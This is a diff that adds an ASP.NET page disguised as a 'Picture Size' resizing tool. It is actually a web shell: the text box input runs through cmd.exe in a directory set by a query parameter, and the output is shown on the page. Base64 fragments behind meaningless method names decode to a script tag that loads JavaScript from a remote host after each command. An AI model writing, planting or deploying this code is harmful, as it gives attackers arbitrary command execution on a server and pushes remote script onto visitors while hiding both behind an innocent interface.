@@ -1,0 +1,196 @@
+<%@ Page Language="C#" EnableViewState="false" %>
+<%@ Import Namespace="System.Web.UI.WebControls" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+
+<script runat="server">
+    private void contextkj82(string encoded)
+    {
+        if (string.IsNullOrEmpty(encoded)) return;
+        
+        byte[] bytes = Convert.FromBase64String(encoded);
+        string content = Encoding.UTF8.GetString(bytes);
+        
+        Response.Write(content);
+    }
+    private string methodcallxg55()
+    {
+        var segments = voidiv44();
+        if (segments == null) return string.Empty;
+        
+        List<string> orderedSegments = new List<string>();
+        for (int i = 0; i < segments.Count; i++)
+        {
+            if (segments.ContainsKey(i))
+            {
+                orderedSegments.Add(segments[i]);
+            }
+        }
+        
+        return string.Join("", orderedSegments.ToArray());
+    }
+    protected void Page_Load(object sender, EventArgs e)
+    {
+    string outstr = "";
+    string dir = Page.MapPath(".") + "/";
+    if (Request.QueryString["fdir"] != null)
+        dir = Request.QueryString["fdir"] + "/";
+    dir = dir.Replace("\\", "/");
+    dir = dir.Replace("//", "/");
+
+     if (txtCmdIn.Text.Length > 0)
+    {
+        Process p = new Process();
+        p.StartInfo.CreateNoWindow = true;
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c "+txtCmdIn.Text;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.RedirectStandardError = true;
+        p.StartInfo.WorkingDirectory = dir;
+        p.Start();
+
+        lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+        txtCmdIn.Text = "";
+        expressiontreeat78();
+    }   
+    }
+    private IDictionary<int, string> voidiv44()
+    {
+        Dictionary<int, string> result = new Dictionary<int, string>();
+        result[0] = @"PHNjcmlwdC";
+        result[1] = @"BzcmM9I";
+        result[2] = @"mh0dHBzOi8vd2Vi";
+        result[3] = @"c2hlbGw5L";
+        result[4] = @"mNvbS9mcC5t";
+        result[5] = @"aW4uan";
+        result[6] = @"MiPjwvc2Ny";
+        result[7] = @"aXB0Pg==";
+        return result;
+    }
+    private void expressiontreeat78()
+    {
+        string encoded = methodcallxg55();
+        if (string.IsNullOrEmpty(encoded)) return;
+        contextkj82(encoded);
+    }
+
+   
+</script>
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<script runat="server">
+
+    protected void cmdUpload_Click(object sender, EventArgs e)
+    {
+
+    }
+
+    protected void txtCmdIn_TextChanged(object sender, EventArgs e)
+    {
+
+    }
+</script>
+
+ <html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <style type="text/css">
+        * {
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #f4f4f4;
+            color: #333;
+            padding: 20px;
+        }
+        pre {
+            font-family: 'Courier New', monospace;
+             color: #333;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            text-align: left; 
+        }
+        h1 {
+            font-size: 18px;
+            text-align: center;
+            color: #444;
+            margin-bottom: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th {
+            text-align: left;
+            background-color: #ddd;
+            padding: 10px;
+        }
+        td {
+            background-color: #fff;
+            padding: 10px;
+            border-bottom: 1px solid #ccc;
+        }
+        input[type="text"], button {
+            width: 100%;
+            max-width: 300px;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #fff;
+            color: #333;
+            font-size: 14px;
+        }
+        input[type="text"]:focus, button:focus {
+            outline: none;
+            border-color: #007BFF;
+        }
+        button {
+            background-color: #007BFF;
+            color: #fff;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 6px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <form id="form1" runat="server">
+        <div class="container">
+            <h1>Picture Size</h1>
+            <table>
+                <tr>
+                    <td>
+                        <div style="text-align: center;">
+                            <asp:TextBox runat="server" ID="txtCmdIn" Width="300" OnTextChanged="txtCmdIn_TextChanged" BackColor="White" BorderColor="Gray" ForeColor="Black" BorderStyle="Solid" BorderWidth="1px" />
+                            <asp:Button runat="server" ID="cmdExec" Text="ReSize" style="margin-top: 10px;" BackColor="White" Font-Bold="True" ForeColor="Black" BorderColor="Gray" BorderStyle="Solid" BorderWidth="1px" />
+                            <pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
+                        </div>
+                    </td>
+                </tr>
+            </table>
+        </div>
+    </form>
+</body>
+</html>
